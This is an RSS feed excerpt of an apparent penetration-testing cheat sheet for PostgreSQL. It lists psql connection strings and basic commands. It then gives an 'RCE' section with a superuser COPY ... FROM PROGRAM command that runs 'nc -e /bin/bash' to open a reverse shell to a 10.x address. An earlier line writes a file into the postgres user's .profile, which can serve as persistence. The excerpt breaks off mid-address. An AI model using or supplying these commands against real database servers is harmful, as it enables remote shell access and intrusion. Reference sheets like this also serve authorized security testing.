channel.title: Postgresql on TLDRBins
channel.description: Recent content in Postgresql on TLDRBins

item.title: Postgresql
item.description: General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database psql postgresql://username:password@localhost:5432/db_name Basic Commands # Show databases \list # Use database \connect db_name # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values ('user', 'password', 'admin'); # Write text copy (select 'test') to '/var/lib/postgresql/.profile'; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.
